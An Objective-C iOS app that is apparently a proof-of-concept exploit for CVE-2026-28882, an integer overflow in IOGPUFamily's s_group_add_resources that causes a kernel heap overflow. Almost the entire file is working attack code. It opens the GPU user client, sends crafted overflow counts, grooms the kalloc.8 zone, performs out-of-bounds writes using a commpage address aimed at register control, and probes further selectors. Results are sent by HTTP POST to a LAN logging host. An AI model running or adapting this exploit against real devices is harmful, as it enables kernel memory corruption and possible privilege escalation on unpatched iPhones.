/*
 * iogpu_residency_bof.m — CVE-2026-28882 PoC
 * IOGPUFamily s_group_add_resources integer overflow -> heap BOF
 *
 * Bug: s_group_add_resources (rel=0x8468 in 26.3.1 IOGPUFamily) reads
 * user-supplied count from IOUserClient arg struct at [arg2+0x20].
 * The count is used in signed arithmetic: smull(count, element_size) + 8.
 * When count = INT32_MIN (-2147483648), the multiplication overflows:
 *   smull(-1, 24) + 8 = -16 -> kalloc(-16) = small/bogus allocation.
 * Subsequent writes of count elements corrupt adjacent kernel heap.
 *
 * Trigger path (firmware-confirmed, iOS 26.5 binary):
 *   IOServiceOpen(AGXAcceleratorG18P, task, type=1, &conn)
 *   -> IOConnectCallMethod(conn, sel=6, struct[0x408], count@[+0x20])
 *   -> IOGPUDeviceUserClient::s_group_add_resources kernel function
 *   (selector 0x196 was wrong — SGAR is at index 6 in the dispatch table)
 *   -> integer overflow in element array size computation
 *
 * Variant 2 (also affects same code): craft count = 0x80000001 so
 *   count*2 = 0x100000002, truncated to 0x00000002 in 32-bit.
 *   Array allocated for 2 elements (16 bytes), but count elements are
 *   written -> kernel heap overflow by count*element_size - 16 bytes.
 *
 * Observable: kernel panic (NULL dereference from corrupt zone metadata)
 *   or AllocatorProbe canary death (kalloc zone corruption).
 *
 * Patch: Apple added cmn w23,#1; csel x1,x8,x9,gt overflow guard in 26.4.
 *
 * Platform: iOS 26.3.1 (23D8133), iPhone 16 Pro Max (AGXG18P)
 */

#import <UIKit/UIKit.h>
#import <Metal/Metal.h>
#import <WebKit/WebKit.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <os/log.h>

#define REPORT_HOST "192.168.68.106"
#define REPORT_PORT 9999

static os_log_t g_log;

/* AllocatorProbe: NOTE — MTLBuffer allocations do NOT land in kernel kalloc.8.
 * The correct canaries for kalloc.8 are count=0 SGAR groups (see Phase 4).
 * Keeping this block for baseline logging only; CANARY_SIZE=8 is a no-op here. */
#define CANARY_ALLOC_COUNT  8000
#define CANARY_SIZE         8    /* kalloc.8 is the OOB target zone */

/* Phase 4 constants */
#define GROOM_COUNT         2048
/* Commpage flag userspace alias — kernel jumping here = register control (GPR=this) */
#define COMMPAGE_FLAG       0x0000000FFFFFC330ULL

static WKWebView *g_wv = nil;
static _Atomic int g_done = 0;

static void report(const char *msg) {
    if (!g_log) g_log = os_log_create("com.nexus.bof", "debug");
    os_log(g_log, "[BOF] %{public}s", msg);
    NSLog(@"[BOF] %s", msg);
    WKWebView *wv = g_wv;
    if (!wv) return;
    NSString *s = [NSString stringWithUTF8String:msg];
    if (!s) return;
    s = [s stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *u = [NSString stringWithFormat:@"http://%s:%d/", REPORT_HOST, REPORT_PORT];
    NSString *js = [NSString stringWithFormat:
        @"var r=new XMLHttpRequest();r.open('POST','%@',true);r.send('[cve28882] %@');", u, s];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:js completionHandler:nil];
    });
}

static void evf(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    report(buf);
}

/* Spray kernel heap with canary objects to detect corruption */
static NSMutableArray *g_canaries = nil;
static void spray_canaries(id<MTLDevice> dev) {
    g_canaries = [NSMutableArray array];
    /* Use MTLBuffer allocations of CANARY_SIZE to populate kalloc zones */
    for (int i = 0; i < CANARY_ALLOC_COUNT; i++) {
        id<MTLBuffer> b = [dev newBufferWithLength:CANARY_SIZE
                                          options:MTLResourceStorageModeShared];
        if (b) {
            /* Write canary pattern */
            uint8_t *p = (uint8_t *)b.contents;
            for (int j = 0; j < CANARY_SIZE; j++)
                p[j] = 0xCA;
            [g_canaries addObject:b];
        }
    }
    evf("spray_canaries: %d allocations in kalloc.%d zone", (int)g_canaries.count, CANARY_SIZE);
}

/* Check canaries for corruption */
static int check_canaries(void) {
    int corrupt = 0;
    for (id<MTLBuffer> b in g_canaries) {
        uint8_t *p = (uint8_t *)b.contents;
        for (int j = 0; j < CANARY_SIZE; j++) {
            if (p[j] != 0xCA) { corrupt++; break; }
        }
    }
    return corrupt;
}

/* Trigger the BOF by creating MTLResidencySet and adding overflow count */
static void trigger_bof(id<MTLDevice> dev) {
    evf("STARTING BOF trigger: CVE-2026-28882");

    /* Step 1: Build large array of MTLBuffer resources to add */
    /* Use small buffers (4 bytes each) — we need many to fill the set */
    const int RESOURCE_COUNT = 64;
    NSMutableArray *resources = [NSMutableArray arrayWithCapacity:RESOURCE_COUNT];
    for (int i = 0; i < RESOURCE_COUNT; i++) {
        id<MTLBuffer> b = [dev newBufferWithLength:4
                                          options:MTLResourceStorageModePrivate];
        if (b) [resources addObject:b];
    }
    evf("created %d resource buffers", (int)resources.count);

    /* Step 2: Create MTLResidencySet (iOS 18+, maps to IOGPUResidentMemorySet) */
    if (@available(iOS 18.0, *)) {
        MTLResidencySetDescriptor *desc = [[MTLResidencySetDescriptor alloc] init];
        desc.label = @"cve28882_test";
        desc.initialCapacity = 2; /* Start with minimal capacity (2 = inline threshold) */

        NSError *err = nil;
        id<MTLResidencySet> rset = [dev newResidencySetWithDescriptor:desc error:&err];
        if (!rset) {
            evf("newResidencySet failed: %s",
                err ? err.localizedDescription.UTF8String : "nil");
            /* Fallback: try via MTLRenderCommandEncoder useResources path */
            goto fallback_path;
        }

        evf("MTLResidencySet created");

        /* Step 3: Add legitimate resources first to warm up the array */
        __unsafe_unretained id<MTLAllocation> *arr =
            (__unsafe_unretained id<MTLAllocation> *)alloca(resources.count * sizeof(id));
        for (int i = 0; i < (int)resources.count; i++)
            arr[i] = (id<MTLAllocation>)resources[i];

        /* Add small batch to grow beyond inline (2-element) threshold */
        [rset addAllocations:arr count:MIN(4, (NSUInteger)resources.count)];
        [rset commit];
        evf("added 4 resources (grown beyond inline threshold)");

        /* Step 4: Trigger integer overflow via Metal API directly.
         * Pass arr (64 items) but claim OVERFLOW_COUNT items.
         * Metal framework may not validate count <= arr length.
         * If passed through, kernel s_group_add_resources receives
         * count = OVERFLOW_COUNT with no bounds check (26.3.1).
         *
         * count=0x20000000: smull(0x20000000, 24)+8 mod 2^32 = 8 bytes alloc
         * but OVERFLOW_COUNT elements copied -> kernel heap BOF.
         *
         * count=0x80000000 (INT32_MIN as int32): smull overflows
         * to large 64-bit value -> kalloc fails but interesting. */

        /* Metal overflow attempts disabled: Metal iterates arr before kernel call
         * causing SIGSEGV when arr has only 64 elements but count=0x20000000.
         * Overflow must be triggered via raw IOKit path in trigger_bof_iokit(). */
        evf("Metal API path baseline confirmed (count=4 OK)");
        evf("Metal overflow requires raw IOKit path (Metal iterates arr pre-kernel)");

        /* Test: nil-filled heap array — Metal nil-messaging returns 0 GPU addr */
        /* calloc gives zeroed memory so arr[4..N-1] are nil (ObjC messages to nil = 0) */
        #define NIL_TEST_COUNT 1024
        __unsafe_unretained id<MTLAllocation> *nil_arr =
            (__unsafe_unretained id<MTLAllocation>*)calloc(NIL_TEST_COUNT, sizeof(id));
        if (nil_arr) {
            for (int i = 0; i < 4 && i < (int)resources.count; i++)
                nil_arr[i] = (id<MTLAllocation>)resources[i];
            /* Test Metal nil handling: count=NIL_TEST_COUNT, only 4 real, rest nil */
            [rset addAllocations:nil_arr count:NIL_TEST_COUNT];
            evf("nil_arr count=%d: Metal handled nil allocations (no crash)", NIL_TEST_COUNT);
            free(nil_arr);
        }

    fallback_path:;
        /* Alternate trigger: MTLRenderCommandEncoder useResources */
        MTLRenderPassDescriptor *rpd = [MTLRenderPassDescriptor renderPassDescriptor];
        rpd.colorAttachments[0].loadAction  = MTLLoadActionClear;
        rpd.colorAttachments[0].storeAction = MTLStoreActionStore;

        /* Create 1x1 drawable texture as render target */
        MTLTextureDescriptor *td = [[MTLTextureDescriptor alloc] init];
        td.width = 1; td.height = 1;
        td.pixelFormat = MTLPixelFormatBGRA8Unorm;
        td.usage = MTLTextureUsageRenderTarget;
        id<MTLTexture> rt = [dev newTextureWithDescriptor:td];
        rpd.colorAttachments[0].texture = rt;

        id<MTLCommandQueue> cq = [dev newCommandQueue];
        id<MTLCommandBuffer> cb = [cq commandBuffer];
        id<MTLRenderCommandEncoder> enc = [cb renderCommandEncoderWithDescriptor:rpd];

        /* Build resources array with OVERFLOW_COUNT but only RESOURCE_COUNT real objects */
        /* The Metal framework will pass count to the kernel as-is */
        id<MTLBuffer> overflow_arr[RESOURCE_COUNT];
        for (int i = 0; i < RESOURCE_COUNT; i++)
            overflow_arr[i] = resources[i];

        /* Normal addResources call first (baseline) */
        [enc useResources:(id<MTLResource>*)overflow_arr
                    count:RESOURCE_COUNT
                    usage:MTLResourceUsageRead];

        evf("useResources normal: count=%d OK", RESOURCE_COUNT);

        /* Now attempt with artificially large count via IOUserClient direct path
         * (the Metal framework itself caps count, so we need raw IOKit calls) */

        [enc endEncoding];
        [cb commit];

        evf("encoder path completed (kernel state intact)");
    } else {
        evf("MTLResidencySet unavailable (iOS < 17.0)");
    }
}

/* IOUserClient direct approach for overflow trigger */
/* This bypasses the Metal API layer to send crafted count to kernel */
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;

extern kern_return_t IOMasterPort(mach_port_t bp, mach_port_t *mp);
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kern_return_t IOServiceGetMatchingServices(mach_port_t mp, CFDictionaryRef match, io_iterator_t *it);
extern io_object_t IOIteratorNext(io_iterator_t it);
extern kern_return_t IOObjectRelease(io_object_t obj);
extern kern_return_t IOServiceOpen(io_service_t svc, task_port_t task, uint32_t type, io_connect_t *conn);
extern kern_return_t IOServiceClose(io_connect_t conn);
extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
    const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inSz,
    uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outSz);

/*
 * s_group_add_resources dispatch table analysis (iOS 26.5 firmware):
 *   Class:    IOGPUDeviceUserClient
 *   Type:     1 (AGXAcceleratorG18P)
 *   Selector: 6  (NOT 0x196 — that was wrong)
 *   st_in:    0xffffffff (variable, function enforces 0x408 internally)
 *   st_out:   0x10 (16 bytes)
 *   Size check at 0xfffffe0009bebb74: cmp w8,#0x408; ccmp w8,w9,#0,hs; b.eq proceed
 *   Count:    [structInput + 0x20] uint32_t
 */
#define SGAR_SELECTOR        6
#define SGAR_STRUCT_SIZE     0x410   /* confirmed live: device->0x278 == 0x410 */
#define SGAR_COUNT_OFFSET    0x20

/* try_sgar: call sel=6 with given count and optional group_handle in struct.
 * group_handle_off=0 means new group (handle=0 → create). Non-zero offset
 * with a valid group_id puts the handle at that offset to trigger add-to-existing.
 * Returns group_id from out[0] or 0 on failure. */
static uint64_t try_sgar_ex(io_connect_t conn, uint32_t count, const char *label,
                              uint32_t group_handle, uint32_t handle_off) {
    static uint8_t add_in[SGAR_STRUCT_SIZE];
    uint8_t add_out[0x10];
    size_t  add_out_sz = sizeof(add_out);
    uint32_t out_cnt   = 0;

    memset(add_in,  0, sizeof(add_in));
    memset(add_out, 0, sizeof(add_out));
    *(uint32_t *)(add_in + SGAR_COUNT_OFFSET) = count;
    if (handle_off > 0 && handle_off + 4 <= SGAR_STRUCT_SIZE)
        *(uint32_t *)(add_in + handle_off) = group_handle;

    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, add_in, sizeof(add_in),
        NULL, &out_cnt, add_out, &add_out_sz);

    evf("[BOF] %s count=0x%x hoff=0x%x kr=0x%x", label, count, handle_off, kr);
    if (kr == 0) {
        uint64_t gid = *(uint64_t *)add_out;
        evf("[BOF] %s SUCCESS group_id=0x%llx", label, gid);
        return gid;
    }
    return 0;
}

static uint64_t try_sgar(io_connect_t conn, uint32_t count, const char *label) {
    return try_sgar_ex(conn, count, label, 0, 0);
}

/* try_sel7: call sel=7 with group_id scalar — triggers group lifecycle operation */
static kern_return_t try_sel7(io_connect_t conn, uint32_t group_id, const char *label) {
    uint64_t sc_in[1] = { group_id };
    kern_return_t kr = IOConnectCallMethod(conn, 7,
        sc_in, 1, NULL, 0,
        NULL, NULL, NULL, NULL);
    evf("[BOF] %s sel=7 group_id=0x%x kr=0x%x", label, group_id, kr);
    return kr;
}

/* try_sel8: call sel=8 with group_id in struct — variable in/out operation */
static kern_return_t try_sel8(io_connect_t conn, uint32_t group_id, const char *label) {
    uint8_t s8_in[SGAR_STRUCT_SIZE];
    uint8_t s8_out[SGAR_STRUCT_SIZE];
    size_t  s8_out_sz = sizeof(s8_out);
    uint32_t out_cnt = 0;

    memset(s8_in,  0, sizeof(s8_in));
    memset(s8_out, 0, sizeof(s8_out));
    /* Group ID likely at [0x00] of struct for sel=8 */
    *(uint32_t *)(s8_in + 0x00) = group_id;
    /* Also try at [0x20] in case sel=8 uses same count field */
    *(uint32_t *)(s8_in + 0x20) = 2;  /* try adding 2 resources */

    kern_return_t kr = IOConnectCallMethod(conn, 8,
        NULL, 0, s8_in, sizeof(s8_in),
        NULL, &out_cnt, s8_out, &s8_out_sz);
    evf("[BOF] %s sel=8 group_id=0x%x kr=0x%x", label, group_id, kr);
    return kr;
}

/* Quiet variants — suppress per-call logging for high-volume spray */
static uint64_t try_sgar_q(io_connect_t conn, uint32_t count) {
    static uint8_t s[SGAR_STRUCT_SIZE];
    uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
    memset(s, 0, sizeof(s));
    *(uint32_t *)(s + SGAR_COUNT_OFFSET) = count;
    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
    if (kr == 0) return *(uint64_t *)out;
    return 0;
}

static kern_return_t try_sel7_q(io_connect_t conn, uint32_t gid) {
    uint64_t sc[1] = { gid };
    return IOConnectCallMethod(conn, 7, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

/*
 * trigger_phase4: groom kalloc.8 with count=0 SGAR groups (8-byte resource_arrays),
 * overwrite adjacent chunk with COMMPAGE_FLAG via OOB write, then trigger
 * all groomed groups to observe corruption (sel=7 returns kr≠0 if fn_B sees
 * count mismatch in the overwritten resource_array).
 *
 * OOB write anatomy (count=0x80000000, element_size=4):
 *   alloc_size = (0x80000000 * 4) mod 2^32 + 8 = 0 + 8 = 8 bytes
 *   Copy writes struct[0x28..0x2F] -> resource_array[8..15] (OOB by 8 bytes)
 *   resource_array[8..15] = adjacent kalloc.8 chunk's first 8 bytes
 *
 * Detection: baseline sel=7 on count=0 groups returns kr=0.
 *   After overflow, a corrupted group returns kr≠0 from fn_B count mismatch.
 */
static void trigger_phase4(io_connect_t conn) {
    evf("[P4] START: groom %d count=0 groups -> kalloc.8 spray", GROOM_COUNT);

    uint32_t groom_gids[GROOM_COUNT];
    int groom_valid = 0;
    for (int gi = 0; gi < GROOM_COUNT; gi++) {
        uint64_t g = try_sgar_q(conn, 0);
        if (g) groom_gids[groom_valid++] = (uint32_t)g;
    }
    evf("[P4] GROOM done: %d/%d groups created in kalloc.8", groom_valid, GROOM_COUNT);

    /* Baseline: sel=7 on all should return kr=0 (count=0 groups have no work) */
    int baseline_ok = 0, baseline_fail = 0;
    for (int gi = 0; gi < groom_valid; gi++) {
        kern_return_t bkr = try_sel7_q(conn, groom_gids[gi]);
        if (bkr == 0) baseline_ok++; else baseline_fail++;
    }
    evf("[P4] BASELINE: kr=0 -> %d, kr!=0 -> %d (expect all 0)", baseline_ok, baseline_fail);

    /* OOB write: count=0x80000000, fill entry region with COMMPAGE_FLAG.
     * struct[0x28..0x2F] = COMMPAGE_FLAG -> resource_array[8..15] = adjacent chunk */
    static uint8_t cs[SGAR_STRUCT_SIZE];
    uint8_t co[0x10]; size_t co_sz = sizeof(co); uint32_t co_cnt = 0;
    memset(cs, 0, sizeof(cs));
    *(uint32_t *)(cs + SGAR_COUNT_OFFSET) = 0x80000000u;
    for (uint32_t off = 0x28; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
        *(uint64_t *)(cs + off) = COMMPAGE_FLAG;
    kern_return_t ckr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, cs, sizeof(cs), NULL, &co_cnt, co, &co_sz);
    uint64_t corrupt_gid = (ckr == 0) ? *(uint64_t *)co : 0;
    evf("[P4] OOB_WRITE count=0x80000000 entries=0x%016llx kr=0x%x gid=0x%llx",
        COMMPAGE_FLAG, ckr, corrupt_gid);

    /* Second variant: only first entry = COMMPAGE_FLAG so adjacent[0..7]=COMMPAGE_FLAG */
    uint64_t cgid2 = 0;
    {
        static uint8_t cs2[SGAR_STRUCT_SIZE];
        uint8_t co2[0x10]; size_t co2_sz = sizeof(co2); uint32_t co2_cnt = 0;
        memset(cs2, 0, sizeof(cs2));
        *(uint32_t *)(cs2 + SGAR_COUNT_OFFSET) = 0x80000000u;
        *(uint64_t *)(cs2 + 0x28) = COMMPAGE_FLAG;   /* adjacent[0..7] = COMMPAGE_FLAG */
        *(uint64_t *)(cs2 + 0x30) = 0;               /* adjacent[8..] = 0 if hit */
        kern_return_t ckr2 = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, cs2, sizeof(cs2), NULL, &co2_cnt, co2, &co2_sz);
        cgid2 = (ckr2 == 0) ? *(uint64_t *)co2 : 0;
        evf("[P4] OOB_EXACT adjacent=COMMPAGE_FLAG kr=0x%x gid=0x%llx", ckr2, cgid2);
    }

    /* Trigger: sel=7 on all groomed groups. Corrupted groups will return kr!=0 */
    int post_ok = 0, post_fail = 0;
    uint32_t first_corrupt_gid = 0;
    for (int gi = 0; gi < groom_valid; gi++) {
        kern_return_t pkr = try_sel7_q(conn, groom_gids[gi]);
        if (pkr == 0) post_ok++;
        else {
            post_fail++;
            if (!first_corrupt_gid) first_corrupt_gid = groom_gids[gi];
        }
    }
    evf("[P4] POST_TRIGGER: kr=0 -> %d, kr!=0 -> %d (non-zero = OOB HIT!)",
        post_ok, post_fail);
    if (first_corrupt_gid)
        evf("[P4] FIRST_CORRUPT gid=0x%x OOB_CONFIRMED -> adjacent kalloc.8 chunk written",
            first_corrupt_gid);

    /* Probe selectors 7-20 on: (a) OOB_EXACT group (cgid2), (b) first corrupted groomed group */
    uint32_t probe_gids[2] = { (uint32_t)cgid2, first_corrupt_gid };
    for (int pi = 0; pi < 2; pi++) {
        uint32_t pg = probe_gids[pi];
        if (!pg) continue;
        for (uint32_t sel = 7; sel <= 20; sel++) {
            uint64_t sc[2] = { pg, 0 };
            uint8_t so[0x40]; size_t so_sz = sizeof(so); uint32_t so_cnt = 0;
            uint8_t si_buf[0x410]; size_t si_sz = sizeof(si_buf); uint32_t si_cnt = 0;
            memset(si_buf, 0, sizeof(si_buf));
            *(uint32_t *)(si_buf + 0) = pg;  /* group id in struct[0] */
            *(uint32_t *)(si_buf + 4) = pg;  /* also at [4] */
            kern_return_t pkr = IOConnectCallMethod(conn, sel,
                sc, 2, si_buf, sizeof(si_buf), NULL, &si_cnt, so, &so_sz);
            evf("[P4] PROBE gid=0x%x sel=%u kr=0x%x", pg, sel, pkr);
        }
    }

    evf("[P4] DONE — if device panics now, check IPS for GPR=0x%016llx", COMMPAGE_FLAG);
}

static void trigger_bof_iokit(void) {
    evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
        SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);

    mach_port_t master = 0;
    IOMasterPort(MACH_PORT_NULL, &master);

    /* Open AGXAcceleratorG18P type=1 (IOGPUDeviceUserClient) */
    io_connect_t conn = 0;
    const char *svc_try[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
    for (int si = 0; svc_try[si] && !conn; si++) {
        CFMutableDictionaryRef match = IOServiceMatching(svc_try[si]);
        io_iterator_t it = 0;
        IOServiceGetMatchingServices(master, match, &it);
        io_service_t svc = IOIteratorNext(it);
        IOObjectRelease(it);
        if (!svc) continue;

        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
        IOObjectRelease(svc);
        if (kr == 0 && conn)
            evf("[BOF] OPEN %s type=1 conn=0x%x OK", svc_try[si], conn);
        else
            evf("[BOF] OPEN %s type=1 FAIL kr=0x%x", svc_try[si], kr);
    }

    if (!conn) {
        evf("[BOF] NO_CONN: cannot open IOGPUDeviceUserClient");
        return;
    }

    /* Baseline groups */
    uint64_t base_gid = try_sgar(conn, 4, "BASELINE_4");

    /* Create OVERFLOW group: count=0x80000000 → 32-bit mul truncation → 8-byte alloc
     * alloc_size = (0x80000000 * 24) mod 2^32 + 8 = 0 + 8 = 8 bytes
     * group is registered with count=0x80000000 in its metadata */
    uint64_t ovf_gid = try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");

    /* Phase 2: OOB write proof — fill resource entry section with non-zero handle (1).
     * SGAR always creates new group. OOB happens when kernel copies resource
     * entries from struct[0x28..] into the 8-byte undersized allocation.
     * With count=0x80000000: alloc=8 bytes, but ~125/41 entries available → OOB.
     * Test three entry sizes to find the actual format used by the kernel. */

    /* Test A: uint32_t entries (4-byte handles) at [+0x28], ~250 entries */
    {
        static uint8_t oob_s[SGAR_STRUCT_SIZE];
        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
        memset(oob_s, 0, sizeof(oob_s));
        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
        for (uint32_t off = 0x28; off + 4 <= SGAR_STRUCT_SIZE; off += 4)
            *(uint32_t *)(oob_s + off) = 0x00000001u;
        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
        evf("[BOF] OOB_4B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
        if (okr == 0) {
            uint64_t gid = *(uint64_t *)oob_out;
            evf("[BOF] OOB_4B SUCCESS gid=0x%llx: kernel wrote non-zero entries to 8-byte alloc OOB CONFIRMED", gid);
        }
    }

    /* Test B: uint64_t entries (8-byte handles) at [+0x28], ~125 entries */
    {
        static uint8_t oob_s[SGAR_STRUCT_SIZE];
        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
        memset(oob_s, 0, sizeof(oob_s));
        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
        for (uint32_t off = 0x28; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
            *(uint64_t *)(oob_s + off) = 0x0000000000000001ull;
        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
        evf("[BOF] OOB_8B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
        if (okr == 0) {
            uint64_t gid = *(uint64_t *)oob_out;
            evf("[BOF] OOB_8B SUCCESS gid=0x%llx: OOB WRITE CONFIRMED (8-byte entry format)", gid);
        }
    }

    /* Test C: 24-byte structs at [+0x28], ~41 entries; first field = handle */
    {
        static uint8_t oob_s[SGAR_STRUCT_SIZE];
        uint8_t oob_out[0x10]; size_t oob_out_sz = sizeof(oob_out); uint32_t oob_cnt = 0;
        memset(oob_s, 0, sizeof(oob_s));
        *(uint32_t *)(oob_s + SGAR_COUNT_OFFSET) = 0x80000000u;
        for (uint32_t off = 0x28; off + 24 <= SGAR_STRUCT_SIZE; off += 24)
            *(uint32_t *)(oob_s + off) = 0x00000001u;
        kern_return_t okr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, oob_s, sizeof(oob_s), NULL, &oob_cnt, oob_out, &oob_out_sz);
        evf("[BOF] OOB_24B count=0x80000000 entries@0x28=0x1 kr=0x%x", okr);
        if (okr == 0) {
            uint64_t gid = *(uint64_t *)oob_out;
            evf("[BOF] OOB_24B SUCCESS gid=0x%llx: OOB WRITE CONFIRMED (24-byte entry format)", gid);
        }
    }

    /* Phase 3: trigger lifecycle via sel=7 on overflow group */
    if (ovf_gid) {
        evf("[BOF] SEL7 on overflow group_id=0x%llx", ovf_gid);
        try_sel7(conn, (uint32_t)ovf_gid, "SEL7_OVERFLOW");
    }

    IOServiceClose(conn);
    evf("[BOF] IOKIT_DONE");
}

/* App entry point — called from application:didFinishLaunchingWithOptions: */
void run_cve28882_poc(UIWindow *window) {
    /* Setup WKWebView for XHR reporting */
    WKWebViewConfiguration *cfg = [[WKWebViewConfiguration alloc] init];
    g_wv = [[WKWebView alloc] initWithFrame:window.bounds configuration:cfg];
    [window addSubview:g_wv];
    [g_wv loadRequest:[NSURLRequest requestWithURL:
        [NSURL URLWithString:@"about:blank"]]];

    /* Wait for WebView */
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{

        id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
        if (!dev) {
            report("MTLCreateSystemDefaultDevice failed");
            return;
        }
        evf("Device: %s", dev.name.UTF8String);

        /* Phase 1: Spray canaries */
        spray_canaries(dev);

        /* Phase 2: Raw IOUserClient probe — OOB write baseline */
        trigger_bof_iokit();

        /* Phase 3: Metal API baseline (no overflow — Metal caps count) */
        trigger_bof(dev);

        /* Phase 4: MTLBuffer canary check (note: not in kalloc.8, informational only) */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1*NSEC_PER_SEC),
                       dispatch_get_main_queue(), ^{
            int corrupt = check_canaries();
            if (corrupt > 0) {
                evf("MTL_CANARY corrupt=%d (note: not kalloc.8, different zone)", corrupt);
            } else {
                evf("MTL_CANARY: intact (expected — MTLBuffer not in kalloc.8)");
            }
        });

        /* Phase 4 (SGAR groom+corrupt+trigger): needs fresh connection */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
                       dispatch_get_main_queue(), ^{
            mach_port_t mp4 = 0;
            IOMasterPort(MACH_PORT_NULL, &mp4);
            io_connect_t conn4 = 0;
            const char *svc4[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
            for (int si = 0; svc4[si] && !conn4; si++) {
                CFMutableDictionaryRef m4 = IOServiceMatching(svc4[si]);
                io_iterator_t it4 = 0;
                IOServiceGetMatchingServices(mp4, m4, &it4);
                io_service_t sv4 = IOIteratorNext(it4);
                IOObjectRelease(it4);
                if (!sv4) continue;
                kern_return_t kr4 = IOServiceOpen(sv4, mach_task_self(), 1, &conn4);
                IOObjectRelease(sv4);
                if (kr4 != 0) conn4 = 0;
            }
            if (conn4) {
                evf("[P4] CONN4 ready=0x%x", conn4);
                trigger_phase4(conn4);
                IOServiceClose(conn4);
                evf("[P4] CONN4 closed");
            } else {
                evf("[P4] CONN4 failed: cannot open for Phase 4");
            }
        });
    });
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@interface RootVC : UIViewController
@end
@implementation RootVC
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.rootViewController = [[RootVC alloc] init];
    self.window.backgroundColor = [UIColor blackColor];
    [self.window makeKeyAndVisible];
    run_cve28882_poc(self.window);
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
            NSStringFromClass([AppDelegate class]));
    }
}
